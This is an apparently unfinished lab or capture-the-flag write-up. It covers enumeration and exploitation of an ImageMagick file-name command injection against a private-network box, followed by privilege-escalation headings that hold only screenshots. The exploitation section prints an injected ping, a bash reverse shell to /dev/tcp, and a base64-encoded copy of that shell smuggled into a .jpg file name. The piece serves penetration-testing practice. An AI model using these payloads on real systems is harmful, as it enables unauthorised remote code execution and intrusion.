#InProgress 
```IP
192.168.195.178
```
# Enumeration

## HTTP 80
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241127102213.png?raw=true)

# Exploitation
We find the following Remote Code Execution vulnerablity:
https://github.com/ImageMagick/ImageMagick/issues/6339
We test it with ping
```
cp test.png '|test"`ping -c 5 192.168.45.237`".jpg'
```
Indeed we receive a response
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241127102941.png?raw=true)
```
echo "bash -i >& /dev/tcp/192.168.45.237/80 0>&1" |base64
```
```
cp test.png '|test"`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIzNy84MCAwPiYxCg==|base64 -d|bash`".jpg'
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241127111925.png?raw=true)
# PrivEsc

## Manual

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241127112224.png?raw=true)
## Automated

### Peass
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241127112623.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241127112643.png?raw=true)
### Mimikatz

# Lateral Movement
